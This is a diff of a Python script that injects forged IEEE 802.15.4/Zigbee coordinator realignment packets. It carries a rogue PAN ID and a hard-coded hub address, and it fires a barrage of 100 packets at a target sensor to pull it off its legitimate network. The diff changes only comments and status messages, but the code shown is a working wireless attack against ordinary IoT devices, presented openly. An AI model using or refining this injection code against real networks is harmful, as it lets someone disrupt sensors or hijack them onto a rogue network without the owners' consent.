@@ -12,7 +12,7 @@ LEGIT_PAN = 0xc719
 ROGUE_PAN = 0xdead
 HUB_IEEE = bytes.fromhex("00124b0039de036e") # Coordinator IEEE
 
-# UPDATED: Using the current address from your 3:12 PM screenshot
+# UPDATED: might need to alter the address
 TARGET_SENSOR = 0x1df4 
 
 def inject_realignment_attack(seq):
@@ -34,11 +34,11 @@ def inject_realignment_attack(seq):
     connector.send(full_packet)
 
 try:
-    print("[!] WATCH WIRESHARK. TRIGGER ATTACK AS SOON AS SENSOR (0x1df4) SENDS DATA!")
+    print("[!] WATCH WIRESHARK. TRIGGER ATTACK AS SOON AS SENSOR SENDS DATA!")
     # Send a continuous barrage to catch the wake-up window
     for i in range(100):
         inject_realignment_attack((200 + i) % 256)
         time.sleep(0.01) # 10ms spacing
 finally:
     dev.close()
-    print("[!] Finished. Check if sensor 0x1df4 begins sending Beacon Requests.")
+    print("[!] Finished. Check if sensor begins sending Beacon Requests.")
